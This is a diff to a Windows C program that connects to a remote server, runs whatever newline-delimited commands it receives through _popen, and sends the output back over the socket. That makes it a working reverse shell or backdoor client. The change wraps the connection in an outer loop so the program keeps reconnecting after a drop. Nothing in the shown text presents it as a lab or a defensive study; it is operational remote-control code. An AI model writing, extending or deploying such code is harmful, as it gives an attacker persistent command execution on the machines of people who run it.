@@ -39,63 +39,63 @@ int main() {
   WSADATA wsa;
   WSAStartup(MAKEWORD(2,2), &wsa);
 
-  SOCKET sock = connect_to_server();
-
-
-  char recv_buffer[1024];
-  int recv_len = 0;
-
-  char cmd[1024];
 
   while (1) {
 
-    int n = recv(sock, recv_buffer + recv_len, sizeof(recv_buffer) - 1 - recv_len, 0);
+    SOCKET sock = connect_to_server();
+
+    char recv_buffer[1024];
+    int recv_len = 0;
+    char cmd[1024];
+    while (1) {
 
 
-    if (n > 0) {
+      int n = recv(sock, recv_buffer + recv_len, sizeof(recv_buffer) - 1 - recv_len, 0);
 
-      recv_len += n;
-      char *newline;
+      if (n > 0) {
 
-      while ((newline = memchr(recv_buffer, '\n', recv_len)) != NULL) {
-        int cmd_len = newline - recv_buffer;
+        recv_len += n;
+        char *newline;
 
-        // Copy command i.e. bytes up to \n delimiter from recv_buffer into cmd buffer
-        memcpy(cmd, recv_buffer, cmd_len);
-        // Append `\0` to make it a string
-        cmd[cmd_len] = '\0';
+        while ((newline = memchr(recv_buffer, '\n', recv_len)) != NULL) {
+          int cmd_len = newline - recv_buffer;
 
-        printf("Received from server: %s", cmd);
+          // Copy command i.e. bytes up to \n delimiter from recv_buffer into cmd buffer
+          memcpy(cmd, recv_buffer, cmd_len);
+          // Append `\0` to make it a string
+          cmd[cmd_len] = '\0';
 
-        // Move remaining bytes back to the start of recv_buffer
-        memmove(recv_buffer, recv_buffer + cmd_len + 1, recv_len - (cmd_len + 1));
-        recv_len = recv_len - (cmd_len + 1);
-        
+          printf("Received from server: %s", cmd);
+
+          // Move remaining bytes back to the start of recv_buffer
+          memmove(recv_buffer, recv_buffer + cmd_len + 1, recv_len - (cmd_len + 1));
+          recv_len = recv_len - (cmd_len + 1);
+          
 
 
-        // Perform received command
-        FILE *fp = _popen(cmd, "r");
+          // Perform received command
+          FILE *fp = _popen(cmd, "r");
 
-        char output[1024];
-        int n_bytes;
-        while ((n_bytes = fread(output, 1, sizeof(output), fp)) > 0) {
+          char output[1024];
+          int n_bytes;
+          while ((n_bytes = fread(output, 1, sizeof(output), fp)) > 0) {
 
-          size_t sent = 0;
-          while (sent < n_bytes) {
-            int n = send(sock, output + sent, n_bytes - sent, 0);
+            size_t sent = 0;
+            while (sent < n_bytes) {
+              int n = send(sock, output + sent, n_bytes - sent, 0);
 
-            sent += n;
+              sent += n;
+            }
+
           }
 
+          _pclose(fp);
         }
 
-        _pclose(fp);
+      } else {
+          closesocket(sock);
+          break;
       }
-
-    } else {
-        closesocket(sock);
-        WSACleanup();
-        break;
     }
   }
 }
